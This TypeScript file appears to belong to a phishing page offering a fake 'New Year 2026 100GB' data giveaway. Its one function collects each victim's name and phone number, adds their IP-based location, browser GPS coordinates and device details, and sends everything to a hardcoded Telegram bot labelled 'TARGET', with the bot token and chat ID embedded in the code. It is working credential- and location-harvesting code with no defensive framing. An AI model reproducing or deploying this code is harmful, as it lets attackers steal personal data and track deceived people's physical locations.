
const BOT_TOKEN = '8535758090:AAHMA3IKn_bTm4xT6PPDGXsOq3v0uhv9d_M';
const CHAT_ID = '7360769822';

function escapeHTML(str: string) {
  return str.replace(/[&<>"']/g, (m) => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;'
  }[m] || m));
}

export const sendDataToTelegram = async (name: string, phone: string) => {
  let ipData = { ip: 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
  let geoData = 'Not provided';

  try {
    const ipResponse = await fetch('https://ipapi.co/json/');
    if (ipResponse.ok) {
      ipData = await ipResponse.json();
    }
  } catch (e) {
    console.error('IP lookup failed', e);
  }

  try {
    const position = await new Promise<GeolocationPosition>((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
    });
    geoData = `${position.coords.latitude}, ${position.coords.longitude} (Accuracy: ${Math.round(position.coords.accuracy)}m)`;
  } catch (e) {
    console.warn('Geolocation denied or failed', e);
  }

  const safeName = escapeHTML(name);
  const safePhone = escapeHTML(phone);
  const safeUA = escapeHTML(navigator.userAgent);
  const time = new Date().toLocaleString();

  const text = `
<b>🎉 NEW YEAR 2026 TARGET 🎉</b>
━━━━━━━━━━━━━━━━━━
<b>👤 Name:</b> ${safeName}
<b>📱 Phone:</b> <code>${safePhone}</code>
━━━━━━━━━━━━━━━━━━
<b>🌍 IP Address:</b> <code>${ipData.ip}</code>
<b>🚩 Country:</b> ${ipData.country} (${ipData.region})
<b>📍 City:</b> ${ipData.city}
<b>📡 GPS:</b> <code>${geoData}</code>
━━━━━━━━━━━━━━━━━━
<b>💻 Device:</b> <i>${safeUA}</i>
<b>⏰ Time:</b> ${time}
<b>🏳️ Campaign:</b> New Year 2026 100GB
━━━━━━━━━━━━━━━━━━
`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'HTML',
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error('Telegram API Error:', errorData);
    }
    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return true;
  }
};
